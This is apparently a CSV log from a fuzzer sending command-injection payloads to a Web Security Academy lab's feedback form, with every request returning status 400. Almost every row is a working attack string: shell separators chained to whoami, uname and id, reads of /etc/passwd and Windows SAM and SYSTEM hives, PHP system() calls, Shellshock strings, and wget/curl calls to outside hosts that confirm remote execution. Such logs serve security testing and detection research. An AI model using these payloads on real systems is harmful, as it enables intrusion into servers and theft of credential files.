id_fuzz_1,308,|| sleep 15,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,309,| sleep 15,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,310,; sleep 15,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,311,& sleep 15 ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,312,&& sleep 15,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,313, {${sleep(20)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,314,{${sleep(20)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,315, {${sleep(3)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,316,{${sleep(3)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,317,| sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,318,; sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,319,& sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,320,&& sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,321,sleep 5,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,322, {${sleep(hexdec(dechex(20)))}} ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,323,{${sleep(hexdec(dechex(20)))}} ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,324,sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,325,| sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,326,; sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,327,& sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,328,&& sysinfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,329,;system('cat%20/etc/passwd'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,330,system('cat C:oot.ini');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,331,system('cat config.php');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,332,system('cat /etc/passwd');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,333,|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,334,| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,335,; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,336,& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,337,&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,338,system('curl https://crowdshield.com/.testing/rce_vuln.txt'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,339,system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,340,system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,341,system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,342,systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,343,| systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,344,; systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,345,& systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,346,&& systeminfo,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,347,system('ls'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,348,system('pwd'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,349,system('pwd');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,350,|| system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,351,| system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,352,; system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,353,& system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,354,&& system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,355,system('sleep 5'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,356,system('sleep 5');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,357,system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,358,system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,359,system('whoami'),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,360,system('whoami');,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,361,test*; ls -lhtR /var/www/,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,362,"test* || perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,363,"test* | perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,364,"test* & perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,365,"test* && perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,366,"test*; perl -e 'print ""X""x16096'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,367,$(`type C:oot.ini`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,368,&&type C:\boot.ini,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,369,"| type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,370,"; type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,371,"& type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,372,"&& type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,373,"type C:\Windowsepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,374,"| type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,375,"; type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,376,"& type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,377,"&& type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,378,"type C:\Windowsepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,379,"| type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,380,"; type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,381,"& type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,382,"&& type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,383,"type C:\WINNTepair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,384,"type C:\WINNTepair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,385,"| type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,386,"; type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,387,"& type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,388,"&& type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,389,"type %SYSTEMROOT%epair\SAM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,390,"| type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,391,"; type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,392,"& type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,393,"&& type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,394,"type %SYSTEMROOT%epair\SYSTEM",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,395,uname,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,396,;uname;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,397,| uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,398,; uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,399,& uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,400,&& uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,401,uname -a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,402,|/usr/bin/id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,403,;|/usr/bin/id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,404,;/usr/bin/id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,405,$;/usr/bin/id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,406,"() { :;};/usr/bin/perl -e 'print ""Content-Type: text/plain\r\n\r\nXSUCCESS!"";system(""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;"");'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,407,() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,408,| wget http://crowdshield.com/.testing/rce.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,409,& wget http://crowdshield.com/.testing/rce.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,410,; wget https://crowdshield.com/.testing/rce_vuln.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,411,$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,412,&& wget https://crowdshield.com/.testing/rce_vuln.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,413,wget https://crowdshield.com/.testing/rce_vuln.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,414,$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
